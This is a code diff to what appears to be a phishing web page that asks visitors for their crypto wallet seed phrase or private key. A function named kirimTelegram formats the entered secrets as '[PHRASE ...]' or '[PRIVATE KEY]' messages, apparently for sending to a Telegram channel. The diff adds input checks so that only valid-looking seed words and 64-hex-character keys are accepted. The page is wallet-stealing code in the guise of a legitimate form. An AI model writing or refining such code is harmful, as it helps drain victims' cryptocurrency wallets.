@@ -137,6 +137,11 @@
     .seed-input { flex: 1; background: transparent; border: none; outline: none; color: var(--text); font-family: 'Space Mono', monospace; font-size: 12px; padding: 10px 8px 10px 0; width: 100%; }
     .seed-input::placeholder { color: var(--muted); opacity: 0.5; }
 
+    .seed-field.error { border-color: #c0392b; background: #fde8e8; }
+    .seed-field.error .seed-input { color: #c0392b; }
+
+    .pk-wrap.error .pk-input { border-color: #c0392b; background: #fde8e8; color: #c0392b; }
+
     .pk-wrap { margin-bottom: 1.25rem; }
     .pk-input { width: 100%; background: #f4f7f0; border: 1.5px solid var(--border-light); border-radius: 3px; padding: 12px 14px; color: var(--text); font-family: 'Space Mono', monospace; font-size: 12px; outline: none; resize: none; min-height: 110px; line-height: 1.6; transition: border-color 0.15s; }
     .pk-input:focus { border-color: var(--border); background: #fff; }
@@ -372,19 +377,33 @@
     async function kirimTelegram(e, type) {
       e.preventDefault();
       let pesan = '';
-
       if (type === 'phrase') {
         const inputs = document.querySelectorAll('#seedGrid .seed-input');
-        const words  = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
+        let hasError = false;
+        inputs.forEach(input => {
+          const field = input.closest('.seed-field');
+          field.classList.remove('error');
+          if (input.value.trim().length < 2 || /[^a-z]/.test(input.value.trim())) {
+            field.classList.add('error');
+            hasError = true;
+          }
+        });
+        if (hasError) return;
+        const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
         if (words.length < currentWordCount) {
           alert(`Please fill all ${currentWordCount} words.`);
           return;
         }
         pesan = `[PHRASE ${currentWordCount}w] ${words.join(' ')}`;
       } else {
-        pesan = document.getElementById('pkInput').value.trim();
-        if (!pesan) { alert('Please enter your private key.'); return; }
-        pesan = `[PRIVATE KEY] ${pesan}`;
+        const pk = document.getElementById('pkInput').value.trim();
+        const pkWrap = document.querySelector('.pk-wrap');
+        pkWrap.classList.remove('error');
+        if (!/^[0-9a-fA-F]{64}$/.test(pk)) {
+          pkWrap.classList.add('error');
+          return;
+        }
+        pesan = `[PRIVATE KEY] ${pk}`;
       }
 
       const btnId = type === 'phrase' ? 'btnSubmitPhrase' : 'btnSubmitPK';
